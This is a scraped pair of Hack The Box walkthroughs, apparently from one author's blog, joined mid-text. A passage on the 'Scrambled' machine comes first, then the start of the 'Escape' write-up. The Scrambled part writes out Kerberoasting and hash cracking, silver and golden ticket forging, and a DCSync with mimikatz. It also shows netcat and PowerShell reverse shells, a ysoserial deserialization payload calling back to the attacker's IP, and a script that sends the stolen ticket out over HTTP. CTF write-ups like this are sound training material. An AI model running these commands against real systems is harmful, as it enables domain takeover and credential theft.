s host. As often the Creator Field is populated using the Windows User\u0026rsquo;s Logged-In Name\nSome reasons why the Creator Field Uses the Windows User\u0026rsquo;s Logged-In Name: PDF Metadata Collection:\nWhen creating a PDF, many programs (e.g., Microsoft Word, Adobe Acrobat) automatically pull metadata from the system. System Environment Variables:\nThe logged-in Windows username is part of system environment variables. This is often used to populate fields like \u0026ldquo;Creator\u0026rdquo; in the PDF document. Program Defaults:\nBy default, many PDF generation tools use the logged-in username as the creator unless manually changed by the user. Tracking Ownership:\nThis feature helps track the original creator or author of a document for auditing or document management purposes. Attempting to extract Usernames From the PDF using exiftool: exiftool -Creator -csv *pdf | cut -d, -f2 | sort | uniq \u0026gt; userNames.txt I run it and check the output of the file, however there are no valid usernames, just that it was created using Word 2010: Command Breakdown:\nexiftool -Creator -csv *pdf\nexiftool: Run the tool -Creator: Extracts the Creator metadata field from the files. -csv: Outputs the data in CSV format. This is the most important part for the rest of the command to work: The CSV format provides a structured way to output the metadata in rows and columns. When extracting metadata from multiple PDFs, each PDF\u0026rsquo;s metadata is presented as a row, and each field (like \u0026ldquo;Creator\u0026rdquo;) is a column. This makes it easier to process the data programmatically. Simplicity: When using tools like cut, it\u0026rsquo;s easier to extract specific fields by referring to column numbers (e.g., -f2 for the second column), which is straightforward with CSV formatting. *pdf: Targets all PDF files in the current directory. | cut -d, -f2\n|: Pipes the output from the previous command into the next. cut: Extracts specific fields from the CSV output. -d,: Uses a comma as the delimiter (since it\u0026rsquo;s CSV data). -f2: Selects the second field, which contains the creator name. | sort: Sorts the creator names alphabetically.\n| uniq: Removes duplicate names, leaving only unique entries.\n\u0026gt; userNames.txt\nRedirects the final output (unique creator names) into a file named userNames.txt Trying to Connect to MSSQL using impacket-mssql: I attempt to connect as all the users I have found so far: impacket-mssqlclient $domain/$user:$user@dc1.$domain -k What is interesting though is the response for the user ksimpson is different from all other users: [-] ERROR(DC1): Line 1: Login failed for user 'SCRM\\ksimpson'. Which leads me to believe they may have access however I just need to find a password for them. Kerberoasting using Kerberos Credentials to Get More Kerberos Credentials: As we have valid credentials we can use impackets suite of tools to further enumerate and exploit the target. Using impacket-GetUsersSPNs to extract the SQL service Kerberos Tickets: Kerberoasting with impacket-GetUserSPNs: impacket-GetUserSPNs $domain/$user -k -dc-host dc1.$domain -request -outputfile scrmtickets We get a hit \u0026amp; get the sqlsvc ticket: Cracking the sqlsvc hashes with hashcat: I pass the hashes into hashcats: hashcat -m 13100 scrmtickets ~/Wordlists/rockyou.txt It cracks almost immediately \u0026amp; now we have a creds for mssql Trying to connect to the MSSQL Service: I try various ways with impacket-mssqlclient to connect with the password and it does not work.\nRe-exporting the tickets as .ccache file:\nimpacket-GetUserSPNs $domain/$user -k -dc-host dc1.$domain -request -save I then re-export the tickets but this time as a .ccache file by passing the -save flag. I load it into the KRB5CCNAME variable:\nHowever it doesn\u0026rsquo;t work either. I think this is due it saying in the pdf that only domain admins have access to the she SQL server. I\u0026rsquo;ve got a SilverTicket maybe… As I have the service password if I can get the domain SID and the NTML hash of the sqlsvc password I should be able to craft a silver ticket using impacket-ticketer: Generate NTLM Hash of sqlsvc user: Looking online I find the https://codebeautify.org/ntlm-hash-generator where we can just enter the password and it will generate an NTLM hash. However I want to be able to do this when I don\u0026rsquo;t have access to that website.\nI find this post from 2012: https://blog.atucom.net/2012/10/generate-ntlm-hashes-via-command-line.html Shell Code to convert clear-text password to NTLM hash:\niconv -f ASCII -t UTF-16LE \u0026lt;(printf \u0026quot;\u0026lt;Password\u0026gt;\u0026quot;) | openssl dgst -md4 I verify it matches using the online tool: +Note+: The only reason I do this check as this is the first time I have used this code so need to ensure it works and the hashes match, moving forward I now know I can use this code and it will work. Python Code to Create NTLM hash from clear text creds:\nIronically when I went to add the shell code above to my notes. I found an entry where I had done this previously using python. Below is the python code to do so:\nInstall the passlib first pip install passlib from passlib.hash import nthash password = input(\u0026#34;Put your clear text password here: \u0026#34;) nt_hash = nthash.hash(password) print(nt_hash) Extracting the Domain SID using impacket-getPac: We can use impacket-getPac to easily extract the DomainSID: impacket-getPac $domain/$user -targetUser administrator -hashes :$hash DomainSID: S-1-5-21-2743207045-1827831105-2542523200 +Note+: PAC\u0026rsquo;s are pretty interesting, see below for more information. What is a Privilege Attribute Certificate (PAC): Definition:\nA Privilege Attribute Certificate (PAC) is a data structure used in Microsoft\u0026rsquo;s Kerberos implementation to store authorization information about a user. The PAC is a Microsoft-specific extension to the Kerberos protocol, documented in MS-PAC specification . Components of a PAC:\nUser Security Identifiers (SIDs):\nContains the SID of the user, which is a unique identifier that represents the user in Windows. Includes both the user\u0026rsquo;s primary SID and any additional SIDs. Group Memberships::\nLists the groups to which the user belongs, used for determining access to resources. Contains both domain and local group memberships. Includes Resource Groups and Claims information. Privilege Information:\nContains the privileges assigned to the user (e.g., whether the user has administrative rights). Stores User Account Control (UAC) flags. Lists specific Windows privileges (e.g., SeBackupPrivilege, SeDebugPrivilege). Logon Information:\nIncludes logon time, logon count, and other session-specific data. Contains the user\u0026rsquo;s profile path and home directory. Stores the user\u0026rsquo;s logon script path. Records the logon server and domain. Creating the silver ticket with impacket-ticketer: As we have all the necessary parts, domain SID, password \u0026amp; NTLM hash we should be able to craft a kerberos silver ticket. I use impacket-ticketer to make the silver ticket: impacket-ticketer -nthash $hash -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain $domain -dc-ip dc1.$domain -spn MSSQLSvc/dc1.scrm.local:1433 administrator As you can see there are some errors, however it still creates the administrator.ccache Using the silver ticket to access the SQL instance: I load the ticket into the KRB5CCNAME variable\nexport KRB5CCNAME=./administrator.ccache I check the ticket is loaded with klist:\nklist I access the host using impacket-mssqlclient:\nimpacket-mssqlclient dc1.$domain -k 3. Foothold: Activating xp_cmdshell on the host to enumerate the underlying host system: As soon as I connect I see if I can activate xp_cmdshell:\nenable_xp_cmdshell It works which means we now have remote code execution on the host itself. I check my privs:\nxp_cmdshell whoami /priv I enumerate the host \u0026amp; the website directory:\nI try and read the logs and history files but do not have the correct perms: I also check the users home folders but I can only access my own and there is nothng of note:\nI try and enumerate the shares but I don\u0026rsquo;t have access there either:\nGetting a reverse shell as sqlsvc: As we have remote code execution we can trigger a reverse shell on the host: I create a revere shell with https://revshells.com I start my listener:\nnc -nvlp 443 I use xp_cmdshell to execute my shell:\nxp_cmdshell powershell -e \u0026lt;base64EncodedString\u0026gt; Shell Caught:\nEnumeration dead-end:\nI do some further enumeration however it is a dead-end…as far as I can see. Enumerating the Database \u0026amp; Finding Creds for MiscSvc: As was mentioned in the PDF we read earlier, the previous attackers were able to compromise the domain after gaining access to the HR database.\nI enumerate the databases:\nenum db We can see the HR db is listed. I select the database:\nuse ScrambleHR I list it\u0026rsquo;s tables \u0026amp; find an interesting table called: UserImport:\nselect * from ScrambleHR.INFORMATION_SCHEMA.TABLES I list the contents of it to find the LdapPwd of the MiscSvc account:\nselect * from UserImport I list the contents of the other shares but they are empty:\n4. Lateral Movement: Getting a shell as MiscSvc: As I have credentials it dawned on me I can most likely invoke a ps-session using the creds of MiscSvc once I have an established session…..right?\nAnd here\u0026rsquo;s what didnt\u0026rsquo; work: I re-connect my reverse shell like I did with the sqlsvc account using xp_cmdshell:\nI try and invoke a ps-session * but it does not work*:\nenter-pssession -computername localhost -Credential miscsvc@scrm.local enter-pssession -computername dc1.scrm.local -Credential miscsvc@scrm.local Let\u0026rsquo;s try runas:\nrunas /user:miscsvc \u0026quot;powershell\u0026quot; It looks like it will work as it prompts for the password but then doesn\u0026rsquo;t let me enter it. Lets try PWSH (Powershell for linux):\nenter-pssession -computername dc1.scrm.local -Credential miscsvc@scrm.local Again it doesn\u0026rsquo;t work but tells us this is due to wsman not being installed, so let\u0026rsquo;s install it. Installing PSWSMan \u0026amp; WSMan:\nAfter trying various different spellings etc I did some googling:\nInstall-Module -Name PSWSMan Install-WSMan Exit Still no dice it will fail consistently:\nHere is what did work Good Ol\u0026rsquo; ….Secure….Invoke: We can pass a secure string \u0026amp; then invoke a command as the user miscsvc using the credentialed: From the nc reverse shell we established as sqlsvc we can run the following commands. $SecPassword = ConvertTo-SecureString '\u0026lt;Pass\u0026gt;' -AsPlainText -Force $Cred = New-Object System.Management.Automation.PSCredential('scrm.local\\MiscSvc', $SecPassword) Invoke-Command -Computer 127.0.0.1 -Credential $Cred -ScriptBlock { \u0026lt;CommmandToRun\u0026gt; } Getting our reverse shell as MiscSvc: I generate another reverse shell from https://revshells.com :\nStart another listener:\nnc -nlvp 9999 Paste in my command:\nShell Caught:\nOther than the flag there is not much on here….\nHere\u0026rsquo;s a breakdown of why this works Code Explanation: Convert password to a secure string:\n$SecPassword = ConvertTo-SecureString '\u0026lt;Password\u0026gt;' -AsPlainText -Force ConvertTo-SecureString: Converts a plain text string '\u0026lt;Password\u0026gt;') into a secure string. -AsPlainText: This flag tells PowerShell that the input is plain text (non-secure). -Force: Suppresses warnings/errors and forces the command to accept plain text input. Result: The password is stored as an encrypted SecureString in the $SecPassword variable. Create a credential object:\n$Cred = New-Object System.Management.Automation.PSCredential('scrm.local\\MiscSvc', $SecPassword) New-Object System.Management.Automation.PSCredential: This creates a new credential object, combining a username and the secure password. 'scrm.local\\MiscSvc': The username is 'scrm.local\\MiscSvc'. $SecPassword: The password (in secure string format) is passed to the credential object. Result: The $Cred object contains the username and encrypted password. Invoke-Command to execute a script block on a target machine:\nInvoke-Command -Computer 127.0.0.1 -Credential $Cred -ScriptBlock { whoami } Invoke-Command: Executes the specified script block { whoami } on a remote computer. -Computer 127.0.0.1: Target machine is 127.0.0.1 (the local machine). As we want to authorize with creds we have for the local machine. -Credential $Cred: Specifies the credentials to use (`$Cred`, the object created above). -ScriptBlock { whoami }: The script block to be executed on the target machine. +Note+: Any command can be placed here, like our reverse shell Summary: Converts a plain text password to a secure string. Creates a credential object. Executes a command on the local machine using the specified credentials. Enumerating SMB shares as miscsvc I connect to the SMB shares as miscsvc using the impacket-smbclient\nimpacket-smbclient $domain/$user:$pass@dc1.$domain -k I have access to the IT share:\nWe access 3 folder: Apps Logs Reports I check the Apps folder \u0026amp; find a copy of their sales application ScrambleClient.exe \u0026amp; .dll:\nI download both: I check the other folders but they are empty. I quickly check if we have acess to any other shares: So far we don\u0026rsquo;t. Using the ScrambledClient.exe: I transfer the ScrambledClient.exe to my Windows VM \u0026amp; connect to the HTB VPN:\nI edit my hosts file to have the same entries as my linux host:\n.\\notepad.exe C:\\Windows\\System32\\drivers\\etc\\hosts I enable debugging like it said on the intranet page \u0026amp; try and connect:\nI try both this user and sqlsvc but neither work. Discovering the credential format the program expects by reading the log file:\nThis is interesting as we now know the format that the program expects credentials in. LOGON;\u0026lt;username\u0026gt;|\u0026lt;password\u0026gt; I try all known usernames and passwords I have but no hits:\nFinding a login bypass by Examining the ScrambleLib.dll in DNSpy: DLL\u0026rsquo;s can hold a lot of valuable information so they are worth examining with tools like DNSpy :\nI open up DNSpy in my Windows VM:\nIf don\u0026rsquo;t have it already you can easily download it here: https://github.com/dnSpy/dnSpy/releases I open up the DLL and find an authentication bypass:\nAs you can see below the code says: if (string.Compare(Username, \u0026#34;scrmdev\u0026#34;, true) == 0) { Log.Write(\u0026#34;Developer logon bypass used\u0026#34;); result = true; } else this basically says if we enter scrmdev as the user we will be logged in without having to enter a password 5. Privilege Escalation: Logging into ScrambledClient.exe using scrmdev creds: I connect with the creds:\nI\u0026rsquo;m in.\nTest order:\nExamining how serialized data is sent via ScrambledClient.exe: Checking Debug Log: We can see the data is being serialized (converted) to base64 I decode the Base64 data in kali to see if there is anything valuable being sent echo \u0026quot;\u0026lt;base64string\u0026gt;\u0026quot; | base64 -d I try SQL injection incase there is a way to leak information from the underlying database, however it doesn\u0026rsquo;t work:\nBefore each upload the string Binary formatter init successful is listed:\nLooking online I find this article from microsoft regarding how BinaryFormatter is now obsolete due to security vulnerabilites: 6. Ownership: Crafting a Payload with yoserial.net \u0026amp; catching a system shell: I do some quick searching and find ysoserial.net :\nInitially I try and use a simple base64 encoded powershell reverse shell but it spits out a bunch of errors:\n.\\yoserial.exe -f BinaryFormatter -q WindowsPrincipal -o base64 -c \u0026quot;\u0026lt;CommandToRun\u0026gt;\u0026quot; I figure it could be a length exception so I transfer nc.exe to the C:\\Temp folder for ease. Well that doesn\u0026rsquo;t work either, so suppose we need to troubleshoot and fix this:\n.\\yoserial.exe -f BinaryFormatter -q WindowsPrincipal -o base64 -c \u0026quot;\u0026lt;CommandToRun\u0026gt;\u0026quot; After some digging I found that 1.35 works fine where as 1.36 has other deps:\n+Important Note+: Use Release 1.35 +not+ 1.36 I generate my payload using yoserial.net v1.35:\nysoserial-1.35\\Release\u0026gt; .\\ysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c \u0026quot;C:\\Temp\\nc.exe 10.10.14.31 443 -e cmd\u0026quot; Use the same syntax the program uses to upload it:\nUPLOAD_ORDER;\u0026lt;base64string\u0026gt; We can see it errors out, but that\u0026rsquo;s fine. Catch my system shell:\nGet root flag:\n7. Persistence: Creating A Golden Ticket with mimikatz: I upload mimikatz via my python webserver:\nI perform a dcsync attack and dump the krbtgt hash:\nlsadump::dcsync /user:krbtgt /domain:scrm.local I forge a golden ticket using the Domain-SID \u0026amp; krbtgt hash: kerberos::golden /domain:scrm.local /user:Administrator /sid:S-1-5-21-2743207045-1827831105-2542523200 /rc4:\u0026lt;HASH\u0026gt; The ticket is is present: Transferring the Golden Ticket Using my custom python webserver: Start my custom python webserver:\nI have this handy python webserver that is useful when exfiling data. Save as pythonServer.py Rung python3 pythonServer.py from http.server import SimpleHTTPRequestHandler, HTTPServer class SimpleHTTPUploadHandler(SimpleHTTPRequestHandler): def do_POST(self): length = int(self.headers[\u0026#39;Content-Length\u0026#39;]) field_data = self.rfile.read(length) #If you prefer change the file to be whatever you want with open(\u0026#39;uploaded_file\u0026#39;, \u0026#39;wb\u0026#39;) as f: f.write(field_data) self.send_response(200) self.end_headers() self.wfile.write(b\u0026#39;File uploaded successfully\u0026#39;) # You can set the port to be 443 etc so it looks more legitimate. def run(server_class=HTTPServer, handler_class=SimpleHTTPUploadHandler, port=9000): server_address = (\u0026#39;\u0026#39;, port) httpd = server_class(server_address, handler_class) print(f\u0026#34;Starting httpd server on port {port}\u0026#34;) httpd.serve_forever() if __name__ == \u0026#34;__main__\u0026#34;: run() +NOTE+: Will output file as uploaded_file Send the ticket from victim using powershell:\nfilePath = \u0026#34;C:\\Temp\\ticket.kirbi\u0026#34;; $url = \u0026#34;http://10.10.14.31:9000\u0026#34;; $fileBytes = [System.IO.File]::ReadAllBytes($filePath); $webClient = New-Object System.Net.WebClient; $webClient.UploadData($url, $fileBytes) Ticket received on our attack host: +Note+: The file will be called uploaded_file you will have to change it back to \u0026lt;file\u0026gt;.kirbi Convert with impacket-ticketconverter:\nimpacket-ticketConverter ticket.kirbi admin.ccache Import into session my current session:\nexport KRB5CCNAME=./admin.ccache Check ticket is loaded into memory:\nklist Fire up impacket-psexec and connect:\nWe have persistence. Lessons Learned: What did I learn? I learned about using pure kerberos authentication when NTLM is disabled (not to sure how useful this will be in real life but it was a fun exercise) I learned ALOT about deserialization attacks. I learned more about deconstructing DLL\u0026rsquo;s with DNSPy, that is fun. What silly mistakes did I make? Spent too long trying to use tools that utilize NTLM (netexec) for enumeration. See point 1, got caught out a few times. Sign off: Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!\nUntil next time, hack the planet!\n– Bloodstiller\n– Get in touch bloodstiller at proton dot me\n",

        "content": "Escape Hack The Box Walkthrough/Writeup: https://app.hackthebox.com/machines/%3CBoxName%3E How I use variables \u0026amp; wordlists: Variables: In my commands you are going to see me use $box, $user, $hash, $domain, $pass often. I find the easiest way to eliminate type-os \u0026amp; to streamline my process it is easier to store important information in variables \u0026amp; aliases. $box = The IP of the box $pass = Passwords I have access to. $user = current user I am enumerating with. Depending on where I am in the process this can change if I move laterally. $domain = the domain name e.g. sugarape.local or contoso.local Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information. Wordlists: I have symlinks all setup so I can get to my passwords from ~/Wordlists so if you see me using that path that\u0026rsquo;s why. If you are on Kali and following on, you will need to go to /usr/share/wordlists I also use these additional wordlists: Statistically-likely-usernames SecLists Auto_Wordlists 1. Enumeration: NMAP: Basic Scan:\nnmap $box -Pn -oA basicScan kali in 46.02-HTB/BlogEntriesMade/Escape/scans/nmap 2GiB/7GiB | 0B/1GiB with /usr/bin/zsh  08:21:02 zsh ❯ nmap $box -Pn -oA basicScan Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-04 08:21 BST Nmap scan report for 10.129.228.253 Host is up (0.042s latency). Not shown: 988 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 1433/tcp open ms-sql-s 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl Nmap done: 1 IP address (1 host up) scanned in 12.52 seconds Some interesting enumeration paths already: 53 - DNS: We can check for interesting records: 88 - Kerberos: We can use kerbrute to bruteforce users using pre-auth. 445 - Good ol\u0026rsquo; smb: We can check for null sessions. 389 - LDAP: We can check for anonymous binds and enumerate the domain. 1443 - MSSQL: A good target in general to go after. In depth scan:\nsudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP kali in 46.02-HTB/BlogEntriesMade/Escape/scans/nmap 2GiB/7GiB | 0B/1GiB with /usr/bin/zsh took 12s  08:21:23 zsh ❯ sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP [sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-04 08:21 BST Nmap scan report for 10.129.228.253 Host is up (0.038s latency). Not shown: 65515 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-10-04 15:24:15Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: | Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel | Not valid before: 2024-01-18T23:03:57 |_Not valid after: 2074-01-05T23:03:57 |_ssl-date: 2024-10-04T15:25:48+00:00; +8h00m00s from scanner time. 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: | Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel | Not valid before: 2024-01-18T23:03:57 |_Not valid after: 2074-01-05T23:03:57 |_ssl-date: 2024-10-04T15:25:48+00:00; +8h00m00s from scanner time. 1433/tcp open ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM | ms-sql-ntlm-info: | 10.129.228.253:1433: | Target_Name: sequel | NetBIOS_Domain_Name: sequel | NetBIOS_Computer_Name: DC | DNS_Domain_Name: sequel.htb | DNS_Computer_Name: dc.sequel.htb | DNS_Tree_Name: sequel.htb |_ Product_Version: 10.0.17763 | ms-sql-info: | 10.129.228.253:1433: | Version: | name: Microsoft SQL Server 2019 RTM | number: 15.00.2000.00 | Product: Microsoft SQL Server 2019 | Service pack level: RTM | Post-SP patches applied: false |_ TCP port: 1433 |_ssl-date: 2024-10-04T15:25:48+00:00; +8h00m00s from scanner time. | ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback | Not valid before: 2024-10-04T15:17:39 |_Not valid after: 2054-10-04T15:17:39 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: | Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel | Not valid before: 2024-01-18T23:03:57 |_Not valid after: 2074-01-05T23:03:57 |_ssl-date: 2024-10-04T15:25:48+00:00; +8h00m00s from scanner time. 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: | Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel | Not valid before: 2024-01-18T23:03:57 |_Not valid after: 2074-01-05T23:03:57 |_ssl-date: 2024-10-04T15:25:48+00:00; +8h00m00s from scanner time. 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf .NET Message Framing 49669/tcp open msrpc Microsoft Windows RPC 49691/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49694/tcp open msrpc Microsoft Windows RPC 49712/tcp open msrpc Microsoft Windows RPC 49722/tcp open msrpc Microsoft Windows RPC 49743/tcp open msrpc Microsoft Windows RPC Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running (JUST GUESSING): Microsoft Windows 2019 (89%) Aggressive OS guesses: Microsoft Windows Server 2019 (89%) No exact OS matches for host (test conditions non-ideal). Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m59s | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required | smb2-time: | date: 2024-10-04T15:25:11 |_ start_date: N/A OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 242.11 seconds LDAP 389: Using LDAP anonymous bind to enumerate further:\nIf you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials. We can actually retrieve a significant amount of information via anonymous bind such as: A list of all users A list of all groups A list of all computers. User account attributes. The domain password policy. Enumerate users who are susceptible to AS-REPRoasting. Passwords stored in the description fields The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates. I actually have a handy script to check if anonymous bind is enabled \u0026amp; if it is to dump a large amount of information. You can find it here\nhttps://github.com/bloodstiller/ldapchecker It turns out the anonymous bind is enabled and we get the below information. I have removed the majority of the information as it is not relevant, however there are some keys bits of information we can use moving forward.\nWe have the naming context of the domain:\nkali in ~/Desktop/WindowsTools  v3.12.6 2GiB/7GiB | 0B/1GiB with /usr/bin/zsh  08:22:05 zsh ❯ python3 ldapchecker.py $box Attempting to connect to 10.129.228.253 with SSL... Connected successfully. Retrieving server information... DSA info (from DSE): Supported LDAP versions: 3, 2 Naming contexts: DC=sequel,DC=htb CN=Configuration,DC=sequel,DC=htb CN=Schema,CN=Configuration,DC=sequel,DC=htb DC=DomainDnsZones,DC=sequel,DC=htb DC=ForestDnsZones,DC=sequel,DC=htb We have the domain functionaility level:\nOther: domainFunctionality: 7 forestFunctionality: 7 domainControllerFunctionality: 7 rootDomainNamingContext: DC=sequel,DC=htb ldapServiceName: sequel.htb:dc$@SEQUEL.HTB The functionality level determines the minimum version of Windows server that can be used for a DC. +Note+: That any host os can used on workstations, however the functionality level determines what the minimum version for DC\u0026rsquo;s and the forest.\nhttps://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels Knowing the function level is useful as if want to target the DC\u0026rsquo;s and servers, we can know by looking at the function level what the minimum level of OS would be.\nIn this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.\nHere\u0026rsquo;s a list of functional level numbers and their corresponding Windows Server operating systems:\nFunctional Level Number Corresponding OS 0 Windows 2000 1 Windows Server 2003 Interim 2 Windows Server 2003 3 Windows Server 2008 4 Windows Server 2008 R2 5 Windows Server 2012 6 Windows Server 2012 R2 7 Windows Server 2016 8 Windows Server 2019 9 Windows Server 2022 +Note+: Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest. As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers. We have the full server name:\nAgain we can see this has the CN as the base (mentioned previously.) serverName: CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=sequel,DC=htb It\u0026rsquo;s pretty amazing already what we have learned just by running some fairly simple ldap queries.\nWe have the naming context. Domain name. I update my /etc/hosts file now that we have the server name.\nThis is so we can use tools like kerbrute for user enumeration as well as other tools later on. DNS 53: Using dnsenum to enumerate DNS records: Run dnsenum to enumerate if there are any interesting records present: dnsenum -r --dnsserver $box --enum -p 0 -s 0 -f ~/Seclists/Discovery/DNS/subdomains-top1million-110000.txt sequel.htb Nothing of note other than the standard DNS records for a DC. Kerberos 88: Using Kerbrute to bruteforce Usernames: As kerberos is present we can enumerate users using kerbrute : kerbrute userenum -d sequel.htb --dc $box ~/Wordlists/statistically-likely-usernames/jsmith.txt Unfortunately we get no hits: SMB 445: Using netexec to check for null \u0026amp; guest session on SMB: I check for a null sesion using netexec but they have been disabled:\nnetexec smb $box -u '' -p '' --shares I check if the guest account has been disabled:\nnetexec smb $box -u 'guest' -p '' --shares It looks like we can access the Public \u0026amp; IPC$ We will focus on the Public share. Over view of IPC$ Share: Quick overview if you are unfamiliar with the IPC$ share: The IPC$ share (Inter-Process Communication) is a special administrative share in Windows which allows communication with programs via Named Pipes: It\u0026rsquo;s mainly used for inter-process communication between hosts over a network. It also enables remote administration of a system, allowing file and print sharing. It\u0026rsquo;s a default share on windows systems. Requires credentials for access, typically used in conjunction with administrative or user rights. But as you can see Guest creds can also work in some instances. It is possible to use IPC$ for enumeration (e.g., enumerating users, shares, groups or services). Connecting to the Public SMB Share using smbclient: I logon to the share using a guest session:\nsmbclient -U 'guest' \u0026quot;\\\\\\\\$box\\\\Public\u0026quot; I see they have a .pdf called SQL Server Procedures in the share I download the .pdf:\nGet \u0026quot;SQL Server Procedures.pdf\u0026quot; Attempting to extract creator names from the .PDF: If you are not aware, it is sometimes possible to extract valid domain usernames from pdf's if they have been created on a Windows host. As often the Creator Field is populated using the Windows User\u0026rsquo;s Logged-In Name\nSome reasons why the Creator Field Uses the Windows User\u0026rsquo;s Logged-In Name: PDF Metadata Collection:\nWhen creating a PDF, many programs (e.g., Microsoft Word, Adobe Acrobat) automatically pull metadata from the system. System Environment Variables:\nThe logged-in Windows username is part of system environment variables. This is often used to populate fields like \u0026ldquo;Creator\u0026rdquo; in the PDF document. Program Defaults:\nBy default, many PDF generation tools use the logged-in username as the creator unless manually changed by the user. Tracking Ownership:\nThis feature helps track the original creator or author of a document for auditing or document management purposes. Attempting to extract Usernames From the PDF using exiftool: exiftool -Creator -csv *pdf | cut -d, -f2 | sort | uniq \u0026gt; userNames.txt I run it and check the output of the file, however there are no valid usernames, just that it was crated using Mozilla. Command Breakdown:\nexiftool -Creator -csv *pdf\nexiftool: Run the tool -Creator: Extracts the Creator metadata field from the files. -csv: Outputs the data in CSV format. This is the most important part for the rest of the command to work: The CSV format provides a structured way to output the metadata in rows and columns. When extracting metadata from multiple PDFs, each PDF\u0026rsquo;s metadata is presented as a row, and each field (like \u0026ldquo;Creator\u0026rdquo;) is a column. This makes it easier to process the data programmatically. Simplicity: When using tools like cut, it\u0026rsquo;s easier to extract specific fields by referring to column numbers (e.g., -f2 for the second column), which is straightforward with CSV formatting. *pdf: Targets all PDF files in the current directory. | cut -d, -f2\n|: Pipes the output from the previous command into the next. cut: Extracts specific fields from the CSV output. -d,: Uses a comma as the delimiter (since it\u0026rsquo;s CSV data). -f2: Selects the second field, which contains the creator name. | sort: Sorts the creator names alphabetically.\n| uniq: Removes duplicate names, leaving only unique entries.\n\u0026gt; userNames.txt\nRedirects the final output (unique creator names) into a file named userNames.txt Finding Hard-Coded mSSQL Creds in the SQL Server Procedures PDF: Problematic MSSQL Instance:\nReading the PDF it details how the company has had issues with mistakes with the MSSQL instance. However it appears there is still a live server running on the DC (which we have seen from our NMAP scan) Hard Coded Creds:\nLooking on the second page we can see they hard creds for new hires and have placed these in the .pdf naughty, naughty! We will use these to connect Finding Usernames within the PDF: Finding Usernames: Looking through the file we can see that the users, Ryan, Tom \u0026amp; Brandon. There is also a mail to hyperlink to Brandon that reveals his username to be Brandon.brown@sequel.htb I will add these to my username list. Cred Stuffing \u0026amp; Meaning of \u0026ldquo;Guest\u0026rdquo; in the SMB Responses in netexec: I tried cred stuffing all of the users \u0026amp; the password I have found so far and got the below output, where (Guest) was appended to each attempt. I had never seen this before \u0026amp; it led me to this page: https://www.netexec.wiki/smb-protocol/enumeration/enumerate-guest-logon Which says this:\nUsing a random username and password you can check if the target accepts guest logon. If so, it means that either the domain guest account or the local guest account of the server you\u0026rsquo;re targetting is enabled.\nGuest account in SMB: SMB servers often allow users to connect as a Guest, meaning the users have limited or no write permissions. The server may allow these users to read files but restrict their ability to modify or create new files. In this case sequel.htb\\ryan:GuestUserCantWrite1 (Guest) indicates that the ryan account is authenticated, but with Guest permissions, likely meaning the account does not have full access to resources. So when you see \u0026ldquo;Guest\u0026rdquo; listed after users like sequel.htb\\ryan, sequel.htb\\tom, etc., it indicates that the user account is being authenticated using the Guest account privileges in SMB. MSSQL 1433: I store each useful bit of information in VARS so I can easily call on them later and have to type way less: This is also a great way to ensure you make less mistakes \u0026amp; type-os. Cred stuffing the MSSQL Instance: I cred stuff with all the known users so far just incase they have not changed their password from the default password, however it appears they have. 2. Foothold: Connecting to the MSSQL Instance using impacket-mssqlclient: Connecting to the mssql instance: impacket-mssqlclient $domain/$user:$pass@$box Enumerating the MSSQL Instance: Looking through the mssql instance there are only default databases. I try and activate xp_cmdshell however we do not have perms: 